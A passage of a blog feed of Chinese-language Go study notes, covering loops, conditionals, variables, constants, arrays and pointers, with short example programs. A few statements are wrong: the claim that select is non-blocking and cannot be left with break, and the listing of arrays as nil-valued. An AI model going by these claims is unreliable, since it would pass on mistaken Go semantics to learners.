    <content type="html"><![CDATA[<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p><code>for</code>循环是一个循环控制结构，可以执行指定次数的循环。</p><p><code>Go</code>语言的<code>For</code>循环有3种形式，只有其中的一种使用分号。</p><h3 id="与C一样"><a href="#与C一样" class="headerlink" title="与C一样"></a>与C一样</h3><p><code>for init; condition; post &#123; &#125;</code>  </p><ol><li>先对表达式<code>1</code>赋初值；</li><li>判别赋值表达式<code>init</code>是否满足给定条件，若满足循环条件，则执行循环体内语句，然后执行<code>post</code>，进入第二次循环，再判别<code>condition</code>；否则不满足条件，就终止for循环，执行循环体外语句。</li></ol><h3 id="与C的while一样"><a href="#与C的while一样" class="headerlink" title="与C的while一样"></a>与C的while一样</h3><p><code>for condition &#123; &#125;</code></p><h3 id="与C的for-一样"><a href="#与C的for-一样" class="headerlink" title="与C的for(;;)一样"></a>与C的for(;;)一样</h3><p><code>for &#123; &#125;</code></p><h3 id="for-range"><a href="#for-range" class="headerlink" title="for range"></a>for range</h3><p><code>for</code>循环的<code>range</code>格式可以对<code>slice、map、数组、字符串</code>等进行迭代循环。格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> oldMap &#123;<br>    newMap[key] = value<br>&#125;<br></code></pre></td></tr></table></figure><p>如果只想读取 key，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> oldMap<br></code></pre></td></tr></table></figure><p>或者这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> key, _ := <span class="hljs-keyword">range</span> oldMap<br></code></pre></td></tr></table></figure><p>如果只想读取 value，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> oldMap  <span class="hljs-comment">//必须使用_来占位</span><br></code></pre></td></tr></table></figure><h2 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h2><p>在循环内使用循环。</p><p>以下为 Go 语言嵌套循环的格式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> [condition |  ( init; condition; increment ) | Range]<br>&#123;<br>   <span class="hljs-keyword">for</span> [condition |  ( init; condition; increment ) | Range]<br>   &#123;<br>      statement(s);<br>   &#125;<br>   statement(s);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>输出100内的所有素数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> i, j <span class="hljs-type">int</span><br><br>   <span class="hljs-keyword">for</span> i=<span class="hljs-number">2</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>      <span class="hljs-keyword">for</span> j=<span class="hljs-number">2</span>; j &lt;= (i/j); j++ &#123;<br>         <span class="hljs-keyword">if</span>(i%j==<span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 如果发现因子，则不是素数</span><br>         &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span>(j &gt; (i/j)) &#123;<br>         fmt.Printf(<span class="hljs-string">&quot;%d  是素数\n&quot;</span>, i);<br>      &#125;<br>   &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h2><p>如果循环中条件语句永远不为<code>false</code>则会进行无限循环，我们可以通过<code>for</code>循环语句中只设置一个条件表达式来执行无限循环</p><h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><h3 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h3><p><code>Go</code>语言中<code>break</code>语句用于以下两方面：</p><ul><li>用于循环语句中跳出循环，并开始执行循环之后的语句。</li><li><code>break</code>在<code>switch</code>（开关语句）中在执行一条<code>case</code>后跳出语句的作用。</li><li>在多重循环中，可以用标号<code>label</code>标出想<code>break</code>的循环。</li></ul><blockquote><p>在<code>Go</code>语言中，<code>break</code>语句在<code>select</code>语句中的应用是相对特殊的。由于<code>select</code>语句的特性，<code>break</code>语句并不能直接用于跳出<code>select</code>语句本身，因为 <code>select</code> 语句是非阻塞的，它会一直等待所有的通信操作都准备就绪。如果需要提前结束 <code>select</code> 语句的执行，可以使用<code>return</code>或者<code>goto</code>语句来达到相同的效果。</p></blockquote><h3 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h3><p>跳过当前循环的剩余语句，然后继续进行下一轮循环。</p><ul><li><code>for</code>循环中，执行<code>continue</code>语句会触发<code>for</code>增量语句的执行。</li><li>在多重循环中，可以用标号<code>label</code>标出想<code>continue</code>的循环。</li></ul><h3 id="goto语句"><a href="#goto语句" class="headerlink" title="goto语句"></a>goto语句</h3><p><code>Go </code>语言的<code>goto</code>语句可以无条件地转移到过程中指定的行。</p><p><code>goto </code>语句通常与条件语句配合使用。可用来实现条件转移， 构成循环，跳出循环体等功能。</p><p>但是，在结构化程序设计中一般不主张使用<code>goto</code>语句， 以免造成程序流程的混乱，使理解和调试程序都产生困难。</p><h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">goto</span> label;<br>..<br>.<br>label: statement;<br></code></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span><br><br>   <span class="hljs-comment">/* 循环 */</span><br>   LOOP: <span class="hljs-keyword">for</span> a &lt; <span class="hljs-number">20</span> &#123;<br>      <span class="hljs-keyword">if</span> a == <span class="hljs-number">15</span> &#123;<br>         <span class="hljs-comment">/* 跳过迭代 */</span><br>         a = a + <span class="hljs-number">1</span><br>         <span class="hljs-keyword">goto</span> LOOP<br>      &#125;<br>      fmt.Printf(<span class="hljs-string">&quot;a的值为 : %d\n&quot;</span>, a)<br>      a++    <br>   &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;循环语句&quot;&gt;&lt;a href=&quot;#循环语句&quot; class=&quot;headerlink&quot; title=&quot;循环语句&quot;&gt;&lt;/a&gt;循环语句&lt;/h1&gt;&lt;h2 id=&quot;for循环&quot;&gt;&lt;a href=&quot;#for循环&quot; class=&quot;headerlink&quot; title=&quot;for循环&quot;&gt;</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>条件语句</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-conditionalStatement/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-conditionalStatement/</id>
    <published>2023-05-27T02:26:22.000Z</published>
    <updated>2023-07-27T02:31:49.196Z</updated>
    
    <content type="html"><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p>由一个布尔表达式后紧跟一个或多个语句组成。</p><h2 id="if…else语句"><a href="#if…else语句" class="headerlink" title="if…else语句"></a>if…else语句</h2><p><code>if </code>语句后可以使用可选的<code>else</code>语句,<code>else</code>语句中的表达式在布尔表达式为<code>false</code>时执行。</p><h2 id="if嵌套语句"><a href="#if嵌套语句" class="headerlink" title="if嵌套语句"></a>if嵌套语句</h2><p>你可以在<code>if</code>或<code>else if</code>语句中嵌入一个或多个<code>if</code>或<code>else if</code>语句。</p><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>用于基于不同条件执行不同动作。每一个<code>case</code>分支都是唯一的，<strong>从上至下</strong>逐一测试，直到匹配为止。</p><p><code>switch</code>默认情况下<code>case</code>最后自带<code>break</code>语句，匹配成功后就不会执行其他<code>case</code>；如果我们需要执行后面的<code>case</code>，可以使用<code>fallthrough</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> var1 &#123;<br>    <span class="hljs-keyword">case</span> val1:    <span class="hljs-comment">//必须是同类型的任意值</span><br>        ...<br>    <span class="hljs-keyword">case</span> val2, val3, val4:    <span class="hljs-comment">//可以同时测试多个值，使用逗号分割</span><br>        ...<br>    <span class="hljs-keyword">default</span>:<br>        ...<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>fallthrough</code><br>使用<code>fallthrough</code>会强制执行后面的<code>case</code>语句，<code>fallthrough</code><strong>不会判断</strong>下一条<code>case</code>的表达式结果是否为<code>true</code>。（默认执行）</p></blockquote><h2 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h2><p>类似<code>switch</code>但是<code>select</code>会随机执行一个可运行的<code>case</code>。如果没有case可运行，它将阻塞，直到有<code>case</code>可运行。</p><blockquote><p><code>Go</code>没有三目运算符，所以不支持 ?: 形式的条件判断。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;条件语句&quot;&gt;&lt;a href=&quot;#条件语句&quot; class=&quot;headerlink&quot; title=&quot;条件语句&quot;&gt;&lt;/a&gt;条件语句&lt;/h1&gt;&lt;h2 id=&quot;if语句&quot;&gt;&lt;a href=&quot;#if语句&quot; class=&quot;headerlink&quot; title=&quot;if语句&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>变量与常量</title>
    <link href="http://lexlady.top/2023/05/25/Golang/go-variable/"/>
    <id>http://lexlady.top/2023/05/25/Golang/go-variable/</id>
    <published>2023-05-25T07:44:28.000Z</published>
    <updated>2023-07-27T02:37:39.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><p><code>var</code>关键字</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>指定变量类型，如果没有初始化，则变量默认为零值。</p><blockquote><p>零值就是变量没有做初始化时系统默认设置的值。<br>数值类型（包括complex64&#x2F;128）为<code>0</code><br>布尔类型为<code>false</code><br>字符串为<code> &quot;&quot;</code>（空字符串）<br>以下几种类型为<code>nil</code>：<br>指针、数组、map、channel、函数、接口</p></blockquote><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>根据值自行判定变量类型。</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>格式：<code>v_name := value</code></p><p>如果变量已经使用<code>var</code>声明过了，再使用<code>:=</code>声明变量，就产生编译错误。</p><blockquote><p>多变量声明<br><code>var vname1, vname2, vname3 type </code>相同类型的多个变量<br><code>vname1, vname2, vname3 = v1, v2, v3</code> </p><p><code>var vname1, vname2, vname3 = v1, v2, v3</code>自动推断类型  </p><p>一般用于声明全局变量<br>var {<br>    vname type1<br>    vname type2<br>}</p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果你在定义变量<code>a</code>之前使用它，则会得到编译错误<code>undefined: a</code></p><p>如果你声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误，<code>a declared but not used</code>；但是全局变量是允许声明但不使用的。</p><p>如果你想要交换两个变量的值，则可以简单地使用<code>a, b = b, a</code>，两个变量的类型必须是相同。这被称为<strong>并行</strong>或<strong>同时</strong>赋值。</p><p>并行赋值也被用于当一个函数返回多个返回值时，比如这里的<code>val</code>和错误<code>err</code>是通过调用<code>Func1</code>函数同时得到：<code>val, err = Func1(var1)</code></p><p>空白标识符<code>_</code>也被用于抛弃值，如值<code>5</code>在：<code>_, b = 5, 7</code>中被抛弃。</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><p><code>Go</code>语言中变量可在三个地方中声明</p><ul><li>函数内定义：局部变量</li><li>函数外定义：全局变量</li><li>函数定义中：形式参数</li></ul><p>局部变量的作用域只在函数体内，参数和返回值变量也是局部变量。</p><p>全局变量可以在整个包甚至外部包（被导出后）使用。</p><p><code>Go</code>语言程序中全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑。</p><p>形式参数会作为函数的局部变量来使用。</p><blockquote><p>可通过花括号来控制变量的作用域，花括号中的变量是单独的作用域，同名变量会覆盖外层。</p></blockquote><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量是一个简单值的标识符，在程序运行时，不会被修改的量。</p><p>常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p><p>常量的定义格式：<code>const identifier [type] = value</code>  </p><blockquote><p>你可以省略类型说明符<code>[type]</code>，编译器可以根据变量的值来推断其类型。</p><ul><li>显式类型定义：<code>const b string = &quot;abc&quot;</code></li><li>隐式类型定义：<code>const b = &quot;abc&quot;</code><br>多个相同类型的声明可以简写为：<code>const c_name1, c_name2 = value1, value2</code></li></ul></blockquote><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">const</span> LENGTH <span class="hljs-type">int</span> = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">const</span> WIDTH <span class="hljs-type">int</span> = <span class="hljs-number">6</span><br>    <span class="hljs-keyword">var</span> area <span class="hljs-type">int</span><br>    <span class="hljs-keyword">const</span> a, b, c = <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;str&quot;</span> <span class="hljs-comment">//多重赋值</span><br>    <span class="hljs-keyword">const</span> (<br>        Unknow = <span class="hljs-number">0</span><br>        Female = <span class="hljs-number">1</span><br>        Male = <span class="hljs-number">2</span><br>    ) <span class="hljs-comment">//枚举赋值</span><br><br>    area = LENGTH * WIDTH<br>    fmt.Printf(<span class="hljs-string">&quot;面积为：%d\n&quot;</span>, area)<br>    <span class="hljs-built_in">println</span>(a, b, c)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>常量可以用<code>len(), cap(), unsafe.Sizeof()</code>函数计算表达式的值。常量表达式中，函数必须是内置函数，否则编译不过。</p></blockquote><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code>，特殊常量，可认为是一个可以被编译器修改的常量。</p><p><code>iota</code>在<code>const</code>关键字出现时将被重置为 0(const 内部的第一行之前)，const 中<strong>每新增一行常量声明</strong>将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p><p><strong>待补充</strong></p><h1 id="值类型和引用类型"><a href="#值类型和引用类型" class="headerlink" title="值类型和引用类型"></a>值类型和引用类型</h1><p>使用值类型的变量直接指向存在内存中的值，一个引用类型的变量<code>r1</code>存储的是<code>r1</code>的值所在的内存地址（数字），或内存地址中第一个字所在的位置。也称指针<br><code>&amp;</code>符号取变量的内存地址。<br>值类型变量使用等号<code>=</code>将一个变量的值赋值给另一个变量时，实际上是在内存中将 i 的值进行了拷贝，使用赋值语句<code>r2 = r1</code>时，只有引用（地址）被复制。对r1的修改也会对r2产生影响</p><p>&#x2F;&#x2F;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; class=&quot;headerlink&quot; title=&quot;变量&quot;&gt;&lt;/a&gt;变量&lt;/h1&gt;&lt;h2 id=&quot;变量声明&quot;&gt;&lt;a href=&quot;#变量声明&quot; class=&quot;headerlink&quot; title=&quot;变量声明&quot;&gt;&lt;/a&gt;变量声明&lt;/h</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>数据类型</title>
    <link href="http://lexlady.top/2023/05/07/Golang/go-dataStructure/"/>
    <id>http://lexlady.top/2023/05/07/Golang/go-dataStructure/</id>
    <published>2023-05-07T10:26:53.000Z</published>
    <updated>2023-07-27T02:44:57.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。</p><h2 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h2><ul><li>常量true</li><li>常量false</li></ul><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>有8位，16位，32位，64位</p><ul><li>int：有符号</li><li>uint：无符号</li></ul><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><ul><li>float32：32位浮点型数</li><li>float64：64位浮点型数</li></ul><h3 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h3><ul><li>complex64：32位实数和虚数</li><li>complex128：64位实数和虚数</li></ul><blockquote><p>byte:类似<code>uint8</code><br>rune:类似<code>int32</code><br>uintptr:无符号整型，用于存放一个指针</p></blockquote><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><p>Go 的字符串是由单个字节连接起来的。<br>Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。</p><blockquote><p>派生类型<br>指针、数组、结构体、channel、函数、切片、接口、Map</p></blockquote><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。</p><p>数组元素可以通过索引来读取（或修改），索引从 0 开始，第一个元素索引为 0，第二个索引为 1，以此类推。</p><h2 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h2><p><code>Go</code>语言数组声明需要指定元素<strong>类型</strong>及元素<strong>个数</strong>：<br><code>var array_name [size]type</code></p><h2 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h2><p><code>var nums = [5]int&#123;100, 2, 5, 8, 10&#125; </code></p><p>通过字面量在声明数组的同时快速初始化数组：<br><code> nums := [5]int&#123;100, 2, 5, 8, 10&#125;</code></p><p>如果数组长度不确定可以使用<code>...</code>代替，此时编译器会根据元素个数自行推断数组长度<br><code>var nums = [...]int&#123;100, 2, 5, 8, 10&#125; </code></p><p><strong>设置了数组的长度</strong>，我们还可以通过指定下标(key:value)来初始化元素：<br><code>nums := [5]int&#123;1:2, 4:10&#125; // [0, 2, 0, 0, 10]</code></p><blockquote><p>初始化数组中<code>&#123;&#125;</code>中的元素个数不能大于<code>[]</code>中的数字。<br>在初始化时没有指定初值的元素将会赋值为零值</p></blockquote><h2 id="访问数组元素"><a href="#访问数组元素" class="headerlink" title="访问数组元素"></a>访问数组元素</h2><p>数组元素可以通过索引（位置）来读取。</p><p>对数组的遍历多采用循环结构</p><h2 id="范围（Range）"><a href="#范围（Range）" class="headerlink" title="范围（Range）"></a>范围（Range）</h2><p><code>range</code>关键字用于循环中迭代数组、切片、通道或集合的元素。</p><p>在数组和切片中它返回元素的索引和索引对应的值，在集合中返回<code>key-value</code>对。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><br></code></pre></td></tr></table></figure><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>Go 语言支持多维数组，以下为常用的多维数组声明方式：<br><code>var arr_name [SIZE1][SIZE2]...[SIZEN]type</code></p><p>二维数组是最简单的多维数组，本质是由多个一维数组组成。</p><p><code>var arrayName [x][y]type</code></p><p>二维数组可认为是一个表格，x 为行，y 为列.</p><p>多维数组初始化或赋值时需要注意<code>Go</code>语法规范，该写在一行就写在一行，一行一条语句。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">a := [<span class="hljs-number">3</span>][<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;  <br> &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; ,   <br> &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125; ,   <br> &#123;<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>&#125;, <span class="hljs-comment">// 这里的 &#125; 必须要有逗号，因为最后一行的 &#125; 不能单独一行，</span><br>&#125;<br><br><span class="hljs-comment">// 或者写成这样</span><br>a := [<span class="hljs-number">3</span>][<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;  <br> &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; ,   <br> &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125; ,   <br> &#123;<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>&#125;&#125;   <br></code></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 创建二维数组</span><br>    sites := [<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]<span class="hljs-type">string</span>&#123;&#125;<br><br>    <span class="hljs-comment">// 向二维数组添加元素</span><br>    sites[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Google&quot;</span><br>    sites[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Runoob&quot;</span><br>    sites[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Taobao&quot;</span><br>    sites[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Weibo&quot;</span><br><br>    <span class="hljs-comment">// 显示结果</span><br>    fmt.Println(sites)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="向函数传递数组的注意事项"><a href="#向函数传递数组的注意事项" class="headerlink" title="向函数传递数组的注意事项"></a>向函数传递数组的注意事项</h2><p>未定义长度的数组只能传给不限制数组长度的函数</p><p>定义了长度的数组只能传给限制了相同数组长度的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// Go 语言的数组是值，其长度是其类型的一部分，作为函数参数时，是值传递</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change1</span><span class="hljs-params">(nums [3]<span class="hljs-type">int</span>)</span></span> &#123;<br>    nums[<span class="hljs-number">0</span>] = <span class="hljs-number">4</span><br>&#125;<br><br><span class="hljs-comment">// 传递进来数组的内存地址，然后定义指针变量指向该地址，则会改变数组的值</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change2</span><span class="hljs-params">(nums *[3]<span class="hljs-type">int</span>)</span></span> &#123;<br>    nums[<span class="hljs-number">0</span>] = <span class="hljs-number">5</span><br>&#125;<br><br><span class="hljs-comment">// Go 语言中对数组的处理，一般采用切片的方式，切片包含对底层数组内容的引用，作为函数参数时，类似于指针传递</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change3</span><span class="hljs-params">(nums []<span class="hljs-type">int</span>)</span></span> &#123;  <br>    nums[<span class="hljs-number">0</span>] = <span class="hljs-number">6</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> nums1 = [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;   <br>   <span class="hljs-keyword">var</span> nums2 = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;    <br>   change1(nums1)    <br>   fmt.Println(nums1)  <span class="hljs-comment">//  [1 2 3]     </span><br>   change2(&amp;nums1)    <br>   fmt.Println(nums1)  <span class="hljs-comment">//  [5 2 3]    </span><br>   change3(nums2)    <br>   fmt.Println(nums2)  <span class="hljs-comment">//  [6 2 3]</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>一个指针变量指向了一个值的内存地址。</p><p>指针的使用：定义——&gt;赋值——&gt;访问指针变量的值</p><p>在使用指针前你需要声明指针：<code>var name 